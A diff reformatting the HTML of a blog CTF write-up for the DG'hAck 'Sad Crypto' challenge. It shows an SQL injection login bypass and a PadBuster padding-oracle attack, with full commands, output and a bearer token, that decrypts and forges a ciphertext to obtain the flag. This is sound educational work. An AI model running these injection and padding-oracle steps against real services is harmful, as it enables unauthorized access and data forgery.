@@ -1,47 +1,139 @@
-<!doctype html><html lang=en><head><title>Writeup DG'hAck: Sad Crypto :: Nicolas Bourras</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="This challenge starts with a login page:
+<!doctype html><html lang=en>
+<head>
+<title>Writeup DG'hAck: Sad Crypto :: Nicolas Bourras</title>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=description content="This challenge starts with a login page:
 
 From the description, we gather that this is a service that generates decryption keys when given a French SSN. Our goal is to get the key for this number: 1-46-85-30-750-318-37.
 admin/admin doesn&amp;rsquo;t seem to work, let&amp;rsquo;s try an SQLi! Entering &amp;quot; or 1=1 -- as the username reveals a second page:
 
-We seem to be able to enter a patient name (that we have to auto-complete), and get a decryption key: 797b4c-c4bd852fe0e32ebda194cb2a9fe00099."><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://nicolasb.fr/blog/writeup-dghack-sad-crypto/><link rel=stylesheet href=https://nicolasb.fr/assets/style.css><link rel=stylesheet href=https://nicolasb.fr/assets/pink.css><link rel=apple-touch-icon href=https://nicolasb.fr/img/apple-touch-icon-192x192.png><link rel="shortcut icon" href=https://nicolasb.fr/img/favicon/pink.png><meta name=twitter:card content="summary"><meta name=twitter:creator content><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Writeup DG'hAck: Sad Crypto"><meta property="og:description" content="This challenge starts with a login page:
+We seem to be able to enter a patient name (that we have to auto-complete), and get a decryption key: 797b4c-c4bd852fe0e32ebda194cb2a9fe00099.">
+<meta name=keywords content>
+<meta name=robots content="noodp">
+<link rel=canonical href=https://nicolasb.fr/blog/writeup-dghack-sad-crypto/>
+<link rel=stylesheet href=https://nicolasb.fr/assets/style.css>
+<link rel=stylesheet href=https://nicolasb.fr/assets/pink.css>
+<link rel=apple-touch-icon href=https://nicolasb.fr/img/apple-touch-icon-192x192.png>
+<link rel="shortcut icon" href=https://nicolasb.fr/img/favicon/pink.png>
+<meta name=twitter:card content="summary">
+<meta name=twitter:creator content>
+<meta property="og:locale" content="en">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Writeup DG'hAck: Sad Crypto">
+<meta property="og:description" content="This challenge starts with a login page:
 
 From the description, we gather that this is a service that generates decryption keys when given a French SSN. Our goal is to get the key for this number: 1-46-85-30-750-318-37.
 admin/admin doesn&amp;rsquo;t seem to work, let&amp;rsquo;s try an SQLi! Entering &amp;quot; or 1=1 -- as the username reveals a second page:
 
-We seem to be able to enter a patient name (that we have to auto-complete), and get a decryption key: 797b4c-c4bd852fe0e32ebda194cb2a9fe00099."><meta property="og:url" content="https://nicolasb.fr/blog/writeup-dghack-sad-crypto/"><meta property="og:site_name" content="Nicolas Bourras"><meta property="og:image" content="https://nicolasb.fr/img/favicon/pink.png"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2020-11-30 01:33:35 +0100 CET"></head><body class=pink><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>Nicolas Bourras</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/about>About</a></li><li><a href=/>Posts</a></li><li><a href=/recipes>Recipes</a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/about>About</a></li><li><a href=/>Posts</a></li><li><a href=/recipes>Recipes</a></li></ul></nav></header><div class=content><div class=post><h1 class=post-title><a href=https://nicolasb.fr/blog/writeup-dghack-sad-crypto/>Writeup DG&rsquo;hAck: Sad Crypto</a></h1><div class=post-meta><span class=post-date>2020-11-30</span></div><span class=post-tags>#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
+We seem to be able to enter a patient name (that we have to auto-complete), and get a decryption key: 797b4c-c4bd852fe0e32ebda194cb2a9fe00099.">
+<meta property="og:url" content="https://nicolasb.fr/blog/writeup-dghack-sad-crypto/">
+<meta property="og:site_name" content="Nicolas Bourras">
+<meta property="og:image" content="https://nicolasb.fr/img/favicon/pink.png">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+<meta property="article:published_time" content="2020-11-30 01:33:35 +0100 CET">
+</head>
+<body class=pink>
+<div class="container center">
+<header class=header>
+<div class=header__inner>
+<div class=header__logo>
+<a href=/>
+<div class=logo>
+Nicolas Bourras
+</div>
+</a>
+</div>
+<div class=menu-trigger>menu</div>
+</div>
+<nav class=menu>
+<ul class="menu__inner menu__inner--desktop">
+<li><a href=/about>About</a></li>
+<li><a href=/>Posts</a></li>
+<li><a href=/recipes>Recipes</a></li>
+</ul>
+<ul class="menu__inner menu__inner--mobile">
+<li><a href=/about>About</a></li>
+<li><a href=/>Posts</a></li>
+<li><a href=/recipes>Recipes</a></li>
+</ul>
+</nav>
+</header>
+<div class=content>
+<div class=post>
+<h1 class=post-title>
+<a href=https://nicolasb.fr/blog/writeup-dghack-sad-crypto/>Writeup DG&rsquo;hAck: Sad Crypto</a></h1>
+<div class=post-meta>
+<span class=post-date>
+2020-11-30
+</span>
+</div>
+<span class=post-tags>
+#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/dghack/>dghack</a>&nbsp;</span><div class=post-content><div><p>This challenge starts with a login page:</p><p><a href=/assets/dghack/sad-crypto-login.png><img src=/assets/dghack/sad-crypto-login.png alt="The login page"></a></p><p>From the description, we gather that this is a service that generates decryption keys when given a French SSN. Our goal is to get the key for this number: <code>1-46-85-30-750-318-37</code>.</p><p><code>admin/admin</code> doesn&rsquo;t seem to work, let&rsquo;s try an SQLi! Entering <code>" or 1=1 --</code> as the username reveals a second page:</p><p><a href=/assets/dghack/sad-crypto-enter-name.png><img src=/assets/dghack/sad-crypto-enter-name.png alt="The key generation page"></a></p><p>We seem to be able to enter a patient name (that we <strong>have</strong> to auto-complete), and get a decryption key: <code>797b4c-c4bd852fe0e32ebda194cb2a9fe00099</code>.</p><p>Looking at the network tab of firefox, we can see the requests that were made:</p><p><a href=/assets/dghack/sad-crypto-requests.png><img src=/assets/dghack/sad-crypto-requests.png alt="The list of requests made while generating a key"></a></p><p>The first request doesn&rsquo;t seem interesting, the second, third and fourth ones are for the auto-complete fields and the last two are used to generate the key.</p><p>The <code>validate</code> request is a POST that contains an SSN (eg: <code>ssn=1-78-67-78-356-789-12</code>). It returns a JSON object:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
+#<a href=https://nicolasb.fr/tags/dghack/>dghack</a>&nbsp;
+</span>
+<div class=post-content><div>
+<p>This challenge starts with a login page:</p>
+<p><a href=/assets/dghack/sad-crypto-login.png><img src=/assets/dghack/sad-crypto-login.png alt="The login page"></a></p>
+<p>From the description, we gather that this is a service that generates decryption keys when given a French SSN. Our goal is to get the key for this number: <code>1-46-85-30-750-318-37</code>.</p>
+<p><code>admin/admin</code> doesn&rsquo;t seem to work, let&rsquo;s try an SQLi! Entering <code>" or 1=1 --</code> as the username reveals a second page:</p>
+<p><a href=/assets/dghack/sad-crypto-enter-name.png><img src=/assets/dghack/sad-crypto-enter-name.png alt="The key generation page"></a></p>
+<p>We seem to be able to enter a patient name (that we <strong>have</strong> to auto-complete), and get a decryption key: <code>797b4c-c4bd852fe0e32ebda194cb2a9fe00099</code>.</p>
+<p>Looking at the network tab of firefox, we can see the requests that were made:</p>
+<p><a href=/assets/dghack/sad-crypto-requests.png><img src=/assets/dghack/sad-crypto-requests.png alt="The list of requests made while generating a key"></a></p>
+<p>The first request doesn&rsquo;t seem interesting, the second, third and fourth ones are for the auto-complete fields and the last two are used to generate the key.</p>
+<p>The <code>validate</code> request is a POST that contains an SSN (eg: <code>ssn=1-78-67-78-356-789-12</code>). It returns a JSON object:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
   <span style=color:#f92672>&#34;success&#34;</span>: <span style=color:#66d9ef>true</span>,
   <span style=color:#f92672>&#34;message&#34;</span>: <span style=color:#e6db74>&#34;&#34;</span>,
   <span style=color:#f92672>&#34;data&#34;</span>: {
     <span style=color:#f92672>&#34;keyRequest&#34;</span>: <span style=color:#e6db74>&#34;f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90&#34;</span>
   }
 }
-</code></pre></div><p>The hash is the same one that&rsquo;s used in the last request. The URL format seems to be <code>/api/v1/keygen/{hash}</code>. The response contains the decryption key, without the dash and with more chars:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
+</code></pre></div><p>The hash is the same one that&rsquo;s used in the last request. The URL format seems to be <code>/api/v1/keygen/{hash}</code>. The response contains the decryption key, without the dash and with more chars:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
   <span style=color:#f92672>&#34;success&#34;</span>: <span style=color:#66d9ef>true</span>,
   <span style=color:#f92672>&#34;message&#34;</span>: <span style=color:#e6db74>&#34;&#34;</span>,
   <span style=color:#f92672>&#34;hash&#34;</span>: <span style=color:#e6db74>&#34;797b4cc4bd852fe0e32ebda194cb2a9fe00099427615c4aae33ad77c9fa298fd&#34;</span>
 }
-</code></pre></div><p>Our first reflex should be to try and pass the SSN that we have to <code>/validate</code>. Unfortunately, the server sends back an error:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
+</code></pre></div><p>Our first reflex should be to try and pass the SSN that we have to <code>/validate</code>. Unfortunately, the server sends back an error:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
   <span style=color:#f92672>&#34;success&#34;</span>: <span style=color:#66d9ef>false</span>,
   <span style=color:#f92672>&#34;message&#34;</span>: <span style=color:#e6db74>&#34;Cette ressource est verrouillée&#34;</span>
 }
-</code></pre></div><p>Let&rsquo;s try to find what kind of hash this is:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ hashid f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90
+</code></pre></div><p>Let&rsquo;s try to find what kind of hash this is:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ hashid f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90
 Analyzing <span style=color:#e6db74>&#39;f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90&#39;</span>
 <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> SHA-384 
 <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> SHA3-384 
 <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Skein-512<span style=color:#f92672>(</span>384<span style=color:#f92672>)</span> 
 <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Skein-1024<span style=color:#f92672>(</span>384<span style=color:#f92672>)</span>
-</code></pre></div><p>SHA-384 doesn&rsquo;t seem to be vulnerable to any kind of interesting vulnerabilities.. Trying to base64 decode it works, but spits out unrecognizable bytes:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ base64 -d <span style=color:#f92672>&lt;&lt;&lt;</span> f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90
+</code></pre></div><p>SHA-384 doesn&rsquo;t seem to be vulnerable to any kind of interesting vulnerabilities.. Trying to base64 decode it works, but spits out unrecognizable bytes:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ base64 -d <span style=color:#f92672>&lt;&lt;&lt;</span> f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90
 �|���m��m�_���������վ5<span style=color:#f92672>}</span>�����<span style=color:#f92672>{</span>N����kF�����^��8�W<span style=color:#f92672>=</span>ۯ<span style=color:#f92672>}</span>�w��Ɲ����f����y�t%
-</code></pre></div><p>Now an interesting thing is that if the hash is slightly modified, for example by switching the <code>f</code> with an <code>a</code>, we get an error:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
+</code></pre></div><p>Now an interesting thing is that if the hash is slightly modified, for example by switching the <code>f</code> with an <code>a</code>, we get an error:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
   <span style=color:#f92672>&#34;ssn&#34;</span>: <span style=color:#e6db74>&#34;!-78-67-78-356-789-12&#34;</span>,
   <span style=color:#f92672>&#34;success&#34;</span>: <span style=color:#66d9ef>false</span>,
   <span style=color:#f92672>&#34;message&#34;</span>: <span style=color:#e6db74>&#34;le numéro de sécurité sociale soumis est invalide&#34;</span>
 }
-</code></pre></div><p>The SSN changed! Let&rsquo;s try another modification:</p><pre><code>Internal Server Error
-</code></pre><p>And we have an error 500. This <em>should</em> make us think of an <a href=https://blog.skullsecurity.org/2013/padding-oracle-attacks-in-depth>oracle padding attack</a>: we know if the hash padding is correct or not when modifying it, since it causes an error. It works independently of the cipher that is used.</p><p>There are multiple scripts available to exploit this vulnerability, we&rsquo;ll use <a href=https://github.com/AonCyberLabs/PadBuster>PadBuster</a>. We need to give it a few informations:</p><ul><li>the error string (or just let it use status codes)</li><li>the authentication headers</li><li>the URL</li><li>the hash we&rsquo;re trying to attack</li><li>the block size</li><li>the encoding of the hash</li></ul><p>We&rsquo;ll set the encoding to <code>1</code>, for lowercase hex, and the block size (after a bit of trial and error) to 16.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ perl padBuster.pl -error <span style=color:#e6db74>&#39;Internal Server Error&#39;</span> -header <span style=color:#e6db74>&#39;authorization::Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjpbeyJpZCI6MX1dLCJpYXQiOjE2MDY3MTM1OTksImV4cCI6MTYwNjg4NjM5OX0.iaQaAM73Zq61fFIaCtqBFCPQiA9M42f-2Z71gWQ2jbU&#39;</span> http://sadcrypto.chall.malicecyber.com/api/v1/keygen/f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90 f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90 <span style=color:#ae81ff>16</span> -encoding <span style=color:#ae81ff>1</span>
+</code></pre></div><p>The SSN changed! Let&rsquo;s try another modification:</p>
+<pre tabindex=0><code>Internal Server Error
+</code></pre><p>And we have an error 500. This <em>should</em> make us think of an <a href=https://blog.skullsecurity.org/2013/padding-oracle-attacks-in-depth>oracle padding attack</a>: we know if the hash padding is correct or not when modifying it, since it causes an error. It works independently of the cipher that is used.</p>
+<p>There are multiple scripts available to exploit this vulnerability, we&rsquo;ll use <a href=https://github.com/AonCyberLabs/PadBuster>PadBuster</a>. We need to give it a few informations:</p>
+<ul>
+<li>the error string (or just let it use status codes)</li>
+<li>the authentication headers</li>
+<li>the URL</li>
+<li>the hash we&rsquo;re trying to attack</li>
+<li>the block size</li>
+<li>the encoding of the hash</li>
+</ul>
+<p>We&rsquo;ll set the encoding to <code>1</code>, for lowercase hex, and the block size (after a bit of trial and error) to 16.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ perl padBuster.pl -error <span style=color:#e6db74>&#39;Internal Server Error&#39;</span> -header <span style=color:#e6db74>&#39;authorization::Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjpbeyJpZCI6MX1dLCJpYXQiOjE2MDY3MTM1OTksImV4cCI6MTYwNjg4NjM5OX0.iaQaAM73Zq61fFIaCtqBFCPQiA9M42f-2Z71gWQ2jbU&#39;</span> http://sadcrypto.chall.malicecyber.com/api/v1/keygen/f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90 f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90 <span style=color:#ae81ff>16</span> -encoding <span style=color:#ae81ff>1</span>
 
 +-------------------------------------------+
 | PadBuster - v0.3.3                        |
@@ -110,7 +202,8 @@ Block <span style=color:#ae81ff>2</span> Results:
 <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Decrypted value <span style=color:#f92672>(</span>ASCII<span style=color:#f92672>)</span>: 1-78-67-78-356-789-12
 <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Decrypted value <span style=color:#f92672>(</span>HEX<span style=color:#f92672>)</span>: 312D37382D36372D37382D3335362D3738392D31320B0B0B0B0B0B0B0B0B0B0B
 <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Decrypted value <span style=color:#f92672>(</span>Base64<span style=color:#f92672>)</span>: MS03OC02Ny03OC0zNTYtNzg5LTEyCwsLCwsLCwsLCws<span style=color:#f92672>=</span>
-</code></pre></div><p>And it worked! The plaintext was the SSN. Now we just have to encrypt our number:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ perl padBuster.pl -error <span style=color:#e6db74>&#39;Internal Server Error&#39;</span> -header <span style=color:#e6db74>&#39;authorization::Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjpbeyJpZCI6MX1dLCJpYXQiOjE2MDY3MTM1OTksImV4cCI6MTYwNjg4NjM5OX0.iaQaAM73Zq61fFIaCtqBFCPQiA9M42f-2Z71gWQ2jbU&#39;</span> http://sadcrypto.chall.malicecyber.com/api/v1/keygen/f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90 f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90 <span style=color:#ae81ff>16</span> -encoding <span style=color:#ae81ff>1</span> -plaintext <span style=color:#e6db74>&#39;1-46-85-30-750-318-37&#39;</span>
+</code></pre></div><p>And it worked! The plaintext was the SSN. Now we just have to encrypt our number:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ perl padBuster.pl -error <span style=color:#e6db74>&#39;Internal Server Error&#39;</span> -header <span style=color:#e6db74>&#39;authorization::Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjpbeyJpZCI6MX1dLCJpYXQiOjE2MDY3MTM1OTksImV4cCI6MTYwNjg4NjM5OX0.iaQaAM73Zq61fFIaCtqBFCPQiA9M42f-2Z71gWQ2jbU&#39;</span> http://sadcrypto.chall.malicecyber.com/api/v1/keygen/f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90 f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90 <span style=color:#ae81ff>16</span> -encoding <span style=color:#ae81ff>1</span> -plaintext <span style=color:#e6db74>&#39;1-46-85-30-750-318-37&#39;</span>
 
 <span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
 
@@ -118,14 +211,49 @@ Block <span style=color:#ae81ff>2</span> Results:
 ** Finished ***
 
 <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Encrypted value is: 2d9d7a71a15312fcf41424dfa18129a37e785ffbb0491d6c95f4de4095356ede00000000000000000000000000000000
-</code></pre></div><p>Let&rsquo;s try to exchange our hash for a decryption key:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl -H <span style=color:#e6db74>&#39;authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjpbeyJpZCI6MX1dLCJpYXQiOjE2MDY3MTM1OTksImV4cCI6MTYwNjg4NjM5OX0.iaQaAM73Zq61fFIaCtqBFCPQiA9M42f-2Z71gWQ2jbU&#39;</span> http://sadcrypto.chall.malicecyber.com/api/v1/keygen/2d9d7a71a15312fcf41424dfa18129a37e785ffbb0491d6c95f4de4095356ede00000000000000000000000000000000 | jq
+</code></pre></div><p>Let&rsquo;s try to exchange our hash for a decryption key:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl -H <span style=color:#e6db74>&#39;authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjpbeyJpZCI6MX1dLCJpYXQiOjE2MDY3MTM1OTksImV4cCI6MTYwNjg4NjM5OX0.iaQaAM73Zq61fFIaCtqBFCPQiA9M42f-2Z71gWQ2jbU&#39;</span> http://sadcrypto.chall.malicecyber.com/api/v1/keygen/2d9d7a71a15312fcf41424dfa18129a37e785ffbb0491d6c95f4de4095356ede00000000000000000000000000000000 | jq
 <span style=color:#f92672>{</span>
   <span style=color:#e6db74>&#34;success&#34;</span>: true,
   <span style=color:#e6db74>&#34;message&#34;</span>: <span style=color:#e6db74>&#34;&#34;</span>,
   <span style=color:#e6db74>&#34;hash&#34;</span>: <span style=color:#e6db74>&#34;2ed35bfd91f07094b4447deac135cb8d4b6e45a69cf7a59a65b5f1ca35698e58&#34;</span>
 <span style=color:#f92672>}</span>
-</code></pre></div><p>And we just have to format it as the webapp does to get the flag: <code>2ed35b-fd91f07094b4447deac135cb8d4b6e45</code>.</p><hr><p><a href=/tags/dghack>View all of the DG&rsquo;hAck articles</a>.</p></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://nicolasb.fr/blog/writeup-dghack-bwing/><span class=button__icon>←</span>
-<span class=button__text>Writeup DG'hAck: Bwing</span></a></span>
-<span class="button next"><a href=https://nicolasb.fr/blog/writeup-dghack-shadowmallet/><span class=button__text>Writeup DG'hAck: Shadowmallet</span>
-<span class=button__icon>→</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2021 Powered by <a href=http://gohugo.io>Hugo</a></span>
-<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://nicolasb.fr/assets/main.js></script><script src=https://nicolasb.fr/assets/prism.js></script></div></body></html>
+</code></pre></div><p>And we just have to format it as the webapp does to get the flag: <code>2ed35b-fd91f07094b4447deac135cb8d4b6e45</code>.</p>
+<hr>
+<p><a href=/tags/dghack>View all of the DG&rsquo;hAck articles</a>.</p>
+</div></div>
+<div class=pagination>
+<div class=pagination__title>
+<span class=pagination__title-h>Read other posts</span>
+<hr>
+</div>
+<div class=pagination__buttons>
+<span class="button previous">
+<a href=https://nicolasb.fr/blog/writeup-dghack-bwing/>
+<span class=button__icon>←</span>
+<span class=button__text>Writeup DG'hAck: Bwing</span>
+</a>
+</span>
+<span class="button next">
+<a href=https://nicolasb.fr/blog/writeup-dghack-shadowmallet/>
+<span class=button__text>Writeup DG'hAck: Shadowmallet</span>
+<span class=button__icon>→</span>
+</a>
+</span>
+</div>
+</div>
+</div>
+</div>
+<footer class=footer>
+<div class=footer__inner>
+<div class=copyright>
+<span>© 2021 Powered by <a href=http://gohugo.io>Hugo</a></span>
+<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span>
+</div>
+</div>
+</footer>
+<script src=https://nicolasb.fr/assets/main.js></script>
+<script src=https://nicolasb.fr/assets/prism.js></script>
+</div>
+</body>
+</html>
